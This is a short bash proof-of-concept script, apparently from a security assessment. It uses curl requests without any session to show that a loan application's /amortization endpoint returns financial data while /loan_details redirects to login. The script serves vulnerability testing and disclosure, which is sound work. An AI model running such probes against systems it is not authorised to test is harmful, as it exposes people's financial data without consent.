#!/bin/bash

# POC: Authentication Enforcement Bypass - Unauthenticated Access to /amortization
# This script demonstrates that the /amortization endpoint is accessible without authentication
# while other protected endpoints require it.

TARGET="${1:-http://localhost:80}"

echo "=========================================="
echo "POC: Unauthenticated Access to /amortization"
echo "=========================================="
echo ""

# Test 1: Access /amortization without any session - should be protected
echo "[TEST 1] Accessing /amortization without authentication..."
echo "Command: curl -i ${TARGET}/amortization?term=60"
RESPONSE=$(curl -i -s "${TARGET}/amortization?term=60" 2>&1)
echo "$RESPONSE"
echo ""

# Check if response contains HTTP 200 (indicating unauthenticated access granted)
if echo "$RESPONSE" | grep -q "HTTP.*200"; then
    echo "✓ VULNERABILITY CONFIRMED: /amortization returns HTTP 200 without authentication"
    echo ""
else
    echo "✗ Expected HTTP 200, response does not match pattern"
    echo ""
fi

# Test 2: Verify /loan_details properly requires authentication
echo "[TEST 2] Verifying that /loan_details properly requires authentication..."
echo "Command: curl -i ${TARGET}/loan_details"
LOAN_RESPONSE=$(curl -i -s "${TARGET}/loan_details" 2>&1)
echo "$LOAN_RESPONSE"
echo ""

# Check if response contains HTTP 302 redirect to /login
if echo "$LOAN_RESPONSE" | grep -q "HTTP.*302"; then
    echo "✓ Expected behavior: /loan_details redirects unauthenticated requests (HTTP 302)"
    echo ""
else
    echo "✗ Unexpected response from /loan_details"
    echo ""
fi

# Test 3: Attempt to access /amortization with different term values
echo "[TEST 3] Testing /amortization with multiple parameter values (no authentication)..."
for term in 12 24 36 60; do
    echo "Testing term=$term:"
    RESPONSE=$(curl -s -o /dev/null -w "HTTP %{http_code}" "${TARGET}/amortization?term=${term}")
    echo "  Response: $RESPONSE"
    if [ "$RESPONSE" != "HTTP 200" ]; then
        echo "  ✗ Unexpected response code"
    fi
done
echo ""

# Test 4: Verify the response contains actual amortization data
echo "[TEST 4] Verifying response contains actual financial data..."
echo "Command: curl -s ${TARGET}/amortization?term=60 | head -20"
AMORT_DATA=$(curl -s "${TARGET}/amortization?term=60")
if echo "$AMORT_DATA" | grep -qi "table\|payment\|principal\|interest"; then
    echo "✓ Response contains amortization table/financial data"
    echo ""
    echo "Sample response (first 500 chars):"
    echo "$AMORT_DATA" | head -c 500
    echo ""
    echo "..."
else
    echo "✗ Response does not contain expected financial data"
fi

echo ""
echo "=========================================="
echo "POC Summary:"
echo "=========================================="
echo "The /amortization endpoint is accessible without authentication,"
echo "while protected endpoints like /loan_details properly enforce"
echo "authentication with HTTP 302 redirects to /login."
echo ""
echo "CRITICAL VULNERABILITY: Authentication bypass on /amortization endpoint"
echo "=========================================="